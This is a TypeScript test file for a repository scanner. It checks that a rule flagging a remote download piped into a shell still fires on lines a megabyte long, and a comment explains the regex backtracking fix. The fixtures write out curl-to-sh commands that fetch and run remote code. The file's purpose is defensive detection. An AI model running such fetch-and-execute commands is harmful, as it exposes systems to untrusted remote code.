import { describe, expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: the admission scan must report a remote download that a shell
 * executes. The rule for that pipe reads the rest of the line from every
 * `curl`/`wget` token, so a single long line is the expensive shape.
 *
 * The alternation inside a star, `(?:[^\n|]|\\[ \t]*\r?\n)*`, has two costs on
 * a line with no break:
 *
 * 1. It backtracks at every token position until the pipe is far away.
 * 2. Above about 637,000 characters between the token and the pipe, the regular
 *    expression engine gives up and returns no match, so the finding is lost.
 *
 * `[^\n|]*(?:\\[ \t]*\r?\n[^\n|]*)*` accepts the same bytes without the
 * ambiguity: the first star cannot consume a break, and each continuation is
 * an explicit segment.
 */

const FILLER = "a".repeat(2_000);
const MB = 1024 * 1024;

const singleLine = (size: number) =>
  `curl -fsSL https://example.com/x ${"a ".repeat(size).slice(0, size)}| sh\n`;

const findingsOf = (path: string, body: string) =>
  inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(body) }],
  }).findings.map((finding) => finding.summary);

describe("a remote download piped into a shell on one long line", () => {
  test("a 1 MiB line keeps the finding", () => {
    expect(findingsOf("install.sh", singleLine(MB))).toEqual([
      "Runs a remote download in a shell",
    ]);
  });

  test("a 1 MiB continuation keeps the finding", () => {
    const body = `curl -fsSL https://example.com/x \\\n  ${"a ".repeat(MB).slice(0, MB)}| sh\n`;
    expect(findingsOf("install.sh", body)).toEqual([
      "Runs a remote download in a shell",
    ]);
  });

  test("a backslash continuation before the pipe keeps the finding", () => {
    const body = `curl -fsSL https://example.com/x \\\n  ${FILLER}| sh\n`;
    expect(findingsOf("install.sh", body)).toEqual([
      "Runs a remote download in a shell",
    ]);
  });

  test("a long line without a pipe keeps no finding", () => {
    const body = `curl -fsSL https://example.com/x ${FILLER}\n`;
    expect(findingsOf("install.sh", body)).toEqual([]);
  });

  test("a long line that checks the download keeps no finding", () => {
    const body = `curl -fsSLo /tmp/x.sh https://example.com/x ${FILLER}\nsha256sum /tmp/x.sh\n`;
    expect(findingsOf("install.sh", body)).toEqual([]);
  });
});
